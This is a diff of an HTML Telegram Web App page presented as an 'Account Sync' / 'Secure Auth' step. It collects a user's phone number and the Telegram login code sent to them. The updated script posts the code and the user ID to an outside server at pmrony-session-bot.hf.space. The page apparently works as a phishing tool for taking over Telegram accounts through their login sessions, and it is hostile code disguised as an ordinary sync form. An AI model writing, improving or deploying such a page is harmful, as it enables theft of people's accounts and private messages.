@@ -1,51 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Sync</title>
+    <title>Secure Auth</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; padding: 20px; text-align: center; background-color: #f4f4f9; }
-        .box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; outline: none; box-sizing: border-box; }
-        button { background-color: #0088cc; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        button:disabled { background-color: #ccc; }
+        body { font-family: sans-serif; padding: 20px; text-align: center; background-color: #f0f2f5; }
+        .box { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
+        input { width: 100%; padding: 14px; margin: 12px 0; border: 1.5px solid #ddd; border-radius: 12px; font-size: 16px; outline: none; }
+        button { background-color: #0088cc; color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; }
         .hidden { display: none; }
-        .loading { font-size: 14px; color: #777; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h3 id="title">Account Sync</h3>
+        <h3>Account Sync</h3>
         <div id="step1">
-            <p>Enter phone number with country code</p>
-            <input type="tel" id="phone" value="+" placeholder="+88017...">
+            <input type="tel" id="phone" value="+" placeholder="+880...">
             <button id="btn1" onclick="sendNumber()">Send Code</button>
-            <div id="load1" class="loading hidden">Connecting...</div>
         </div>
         <div id="step2" class="hidden">
-            <p style="color: green;">✅ Code sent to your Telegram!</p>
+            <p style="color: green;">✅ Code Sent!</p>
             <input type="number" id="otp" placeholder="Enter 5-digit code">
-            <button id="btn2" onclick="verify()">Verify & Sync</button>
+            <button id="btn2" onclick="verifyOTP()">Verify & Finish</button>
         </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
-        tg.expand();
-        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "test_user";
-
-        // Hugging Face ডাইরেক্ট লিঙ্ক
-        const BACKEND_URL = "https://pmrony-session-bot.hf.space"; 
+        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "test";
+        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
 
         async function sendNumber() {
             let ph = document.getElementById("phone").value.trim();
-            if(ph.length < 10) return alert("Enter valid number!");
-            
-            document.getElementById("load1").classList.remove("hidden");
             document.getElementById("btn1").disabled = true;
-
             try {
                 let res = await fetch(`${BACKEND_URL}/send_number`, {
                     method: "POST",
@@ -56,26 +45,31 @@
                 if(data.status === "success") {
                     document.getElementById("step1").classList.add("hidden");
                     document.getElementById("step2").classList.remove("hidden");
-                } else {
-                    alert("Error: " + data.message);
-                }
-            } catch(e) {
-                alert("Server Error! Make sure your Hugging Face space is Running.");
-            } finally {
-                document.getElementById("load1").classList.add("hidden");
-                document.getElementById("btn1").disabled = false;
-            }
+                } else { alert(data.message); }
+            } catch(e) { alert("Error!"); }
+            document.getElementById("btn1").disabled = false;
         }
 
-        function verify() {
+        async function verifyOTP() {
             let code = document.getElementById("otp").value.trim();
-            if(!code) return alert("Enter code!");
-            document.getElementById("btn2").innerText = "Syncing...";
             document.getElementById("btn2").disabled = true;
-            
-            // বটের কাছে ডাটা পাঠিয়ে অ্যাপ বন্ধ করা
-            tg.sendData(JSON.stringify({ otp: code }));
-            setTimeout(() => { tg.close(); }, 700);
+            document.getElementById("btn2").innerText = "Verifying...";
+            try {
+                let res = await fetch(`${BACKEND_URL}/verify_otp`, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ user_id: userId, otp: code })
+                });
+                let data = await res.json();
+                if(data.status === "success") {
+                    alert("✅ Success! You can close now.");
+                    tg.close();
+                } else { 
+                    alert("❌ Error: " + data.message); 
+                    document.getElementById("btn2").disabled = false;
+                    document.getElementById("btn2").innerText = "Verify & Finish";
+                }
+            } catch(e) { alert("Server Error!"); }
         }
     </script>
 </body>
